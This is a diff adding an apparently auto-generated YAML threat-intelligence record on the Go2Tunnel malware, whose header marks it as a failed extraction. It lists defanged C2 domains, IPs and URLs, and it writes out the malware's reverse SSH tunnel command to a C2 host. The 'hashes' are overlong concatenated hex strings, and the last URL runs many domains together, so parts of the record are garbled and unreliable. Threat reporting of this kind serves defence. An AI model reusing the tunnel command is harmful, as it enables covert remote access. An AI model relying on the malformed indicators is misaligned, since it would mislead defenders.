@@ -1,0 +1,78 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T20:51:23.102282
+# Response length: 6078 chars
+# Input chunk preview: 'nnel, if serverTunnelPortwas not present in the configuration, the malware queried the C2 server, generated a user ID, and retrieved the username, which was then sent to the /tunnel/registerendpoint t'
+# ============================================================
+
+title: "Threat Report on Go2Tunnel Malware"
+description: The malware Go2Tunnel establishes an SSH tunnel to communicate with a C2 server, retrieves configuration data including private keys, and writes them to specific locations.
+attribution: ""
+malware_families:
+  - Go2Tunnel
+cves: []
+ttps:
+  processes:
+    - ssh.exe
+  command_lines:
+    - "ssh.exe -R <sshTunnelPort>:127.0.0.1:22 -N -T -i \"<tunPrivateKeyPath>\" -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -o ServerAliveInterval=45 -p <SSH_C2Port> forwarder@<C2>"
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+    - "ssh.exe -> 145.223.70[.]69:80"
+    - "forwarder@<C2> -> <SSH_C2Port>"
+  file_activity:
+    - "Drivers64Sys/ssh_tunnel_config"
+    - "C:\Users\<current_username>\.ssh\authorized_keys"
+    - "C:\Users\<generated_username>\.ssh\authorized_keys"
+  persistence: []
+  process_relations: []
+iocs:
+  hashes:
+    - 9217fae9b63203cdc0cb204b53314d056e01fc760707dcaa89e66e43d688b25e4263c458ef216f8e2524462ea3efe79be44492d51143a519081c429c3c24c166c1fbd66467449d3c8d9d07a939843a49fad9de9ac484241d52f0d5a94299ca62e1f359773da3b014389018ef8a22a15acb2157b43cff5f507237ca7093174b11f8c10fd2b3d254cff0c7927c188a7751568fe7ff3eace1de83bb3148bc14a339
+    - df1d20e392f7b7c5c408bdda317e0733e5ec27a973e3bf75034c6566343aa67f677c5ad47c8feaf6a5c0b084060347bcf48f0ccadcdf951b3d48553f4520feaa82254b86590762b2946c6584db35d3872a5d6b85d30e8c07adb95de2126a4f97a20870bee771efe1ea01761d7978cc7b68b0a3c32c617675464f9c4dbe0a5d6688ebed34ab9ff0e16dc32b789fc25295ea570f86244e89cb68803c517597cfdd3d280f5bb4e1eba8c1a65c7d17411286f7b3dbe7db48130f7d5a3be421ffc2ae34db59b663c15cd03cdd92bf24bdff25b756dd51f0540fecaac2a0cab47480ae996df9ce30ace63c0c516cbacfa4e308b555a2d2c44c9d6550b543b9fccc845d09c83fc5f1656cc4be749c64bfc53d2ef612c9b79dc3937b8bb137754c82216a688a1dc207ead232cb8ae6f67fcca1cf7892d83a01af024c404e636cb6ba4cb2
+    - 376276fb34d3ce82f2e15b3b27978ffce1896320f4ba226c1eeda778e1fe5714471e5e26a0e0796e79e0ef09a0565b7e50c3ff39da0ba42a45c35dcc3922dc2c6498d18edb1d440783ae1e7921ebd491872b81b91968bcb246086bf1e08b68f6aa52dd66071b673416947a798d1f5118405eb94476db08a2ada2eaa5bdeeb276e321a2348bfba68e642f8b13bbdbebc394a4364bddbdadf8b37e4bff80200de18ac118cc76584487b7f71d91fee2c344a7e33ee8043043920895e9851fa257e23fe1405a47d1f58c1f7b54d12de574542b32e6d67586d43f119575b906da0a381951325e1bf6f927ae4bd57fec4d2b5b893cdac2d98c010ef716db254e8d4e7fd8ad86cf071b914cc0e828c5b3ff68a72fb5ce776f49dd2aa3f56e7d8af142f85869fb9280846dd77c3fb38b976cf760f889481947cda76a779cf69f48d57daabbbb345cf004992fd8a0ca8c900458f15d6ae939f7f41a60c28a67475af59289b97fba0accfaf94ae416c2cf1a17a01c281c5565c80fb525ee00f1191a62eff910b6d2cb69d9902afc2157c81b31b066ffd53e9deb156787b68e4fdea2c081b471155a0940a2c19789d8a8efb285ac3dff5d680a93902901afe6cc893f278ce9edb4e02547daba247fea1f95d5a45f4cf0cc2a35259cd2e07ae5f99c76910751487154b1e2a96627d1eeb5d679e3e37269a27701f32b8769b6aa9f9ea640a53ce8de53d4c7558b836f701af0f2e6db5807b10cf9a0d10543bb53357c17b936b3ea312fc2bc4dffcaa69d4308ed9d58ae26051285777bbf05665eb625d94dab27b965badd209359e7b19c423e321193b308101b844bdf14704228e27f46c7ffe0dc6243760263153e4245d8ca37821d2ff2889c78bcd9e9849050e10e26ac3fb3cde5ea7788856304e869254fdc90e76adf6990651b72c7351609e707fbf36c0e5d759393935faa272f3a7b2dd827d010abd40ead178aba45b360c83ebbcd5e84d55a9680b9df14da5e434d5839734c1ed7d9a44348bfd4868e36682203282cc480419e4fbe836b59f96697a8b35acb9903d34796e12ea0cd2349b3c01fe3f9e85c23d87edca803f7579129a0f6cc18796f67bf55b0c9d053e47edd5f9b501b62c9c9cf72eaf105be6345aef989c88c27d75bbad935efbc349232b84939d594995058b50371a666a585e2438b113825ea07a525b1fe3529a6988e2416d5b4e89dbcc9f8baa79c96e6adfbef6dc35d841b63b5c09029f9845fe52bcd76b53a51b9aa5f6d919f0f7055e7a22c566463615f208f0b70e5cc56a927baa95796432dcbc43fea1537004b69e1d7b7897af22e7813f4a86f4a53fa44263d3998bfef3a25c2a86a9fe38f46eea465290e68c8ee90e474acd3c3fa5f0b6704168965e98f8b54318d50f463de10661d13701c2acd183a3bd00ea0d01fd74ccdb778f073ea7a5047eae07f5d4dca559c5e04d60ecd775fce4e448d00f7b61c38b737ecbd5586ef72cd3ed4b2d86466ad674b09f077f68909038fba8015f95cfddbf4f53900d4dbf9a2d1936df83e9764c0233623b581c8e0bf9e331ff0a636721438ce7a1dd5
+  ip_addresses:
+    - 145.223.70[.]69
+    - 104.194.158[.]63
+    - 203.161.56[.]226
+  domains:
+    - syncheaven[.]online
+    - battleflight[.]org
+    - battleflight[.]pro
+    - certcheck[.]online
+    - re-link[.]spacemystarlink[.]org
+    - web-tellegram[.]org
+    - stardebug[.]app
+    - alphafly-drones[.]com
+    - newfolder[.]click
+    - configurationserv[.]com
+    - cloudanalitics[.]net
+    - servupdate[.]net
+    - synchro-service[.]com
+    - prodacserv[.]net
+    - updateserv[.]net
+  urls:
+    - hxxps://syncheaven[.]online/sync/now/ru/moscow/fetch
+    - hxxps://battleflight[.]org/download/installer
+    - hxxps://battleflight[.]pro/static/media/BattleFlight_Installer.exe
+    - hxxps://certcheck[.]online/certificate/check/Wi5kyh3yFeUF2VhIiFX572eR3870GxYrk7f1Q7MLV5vJ3xGnf4
+    - hxxps://web-tellegram[.]org/ru
+    - hxxps://web-tellegram[.]org/socket.io/?EIO=4&transport=polling&t=ikzknftw&sid=0TY7i-pDpxsIn8b4ABJ6
+    - hxxp://configurationserv[.]com/tunnel/register
+    - hxxp://cloudanalitics[.]net/tunnel/register
+    - hxxps://servupdate[.]net/array/array9.json
+    - hxxps://synchro-service[.]com/array8/array8.json
+    - hxxp://203.161.56[.]226/public/catalog/machine/register
+    - hxxp://203.161.56[.]226/public/starlink
+    - hxxp://203.161.56[.]226/public/starlink/starlink-v2
+    - hxxps://prodacserv[.]net/array/array10.json
+    - hxxps://servupdate[.]net/array/array9.json
+    - hxxps://updateserv[.]net:443/check
+    - hxxps://updateserv[.]net:443/backup/get-time
+    - hxxps://updateserv[.]net:443/file/uploadChunk
+    - hxxps://updateserv[.]net:443/backup/update-subtask-status
+    - hxxps://updateserv[.]net:443/cmd/upload-result
+    - hxxps://updateserv[.]net:443/clients/filesupdatewin[.]netserverscreen[.]nettoolsserv[.]comservicefor8[.]comfor8service[.]netupdateserv[.]netconfigurationserv[.]comcloudanalitics[.]netservupdate[.]netsynchro-service[.]comprodacserv[.]net203.161.56[.]226
+authors: []
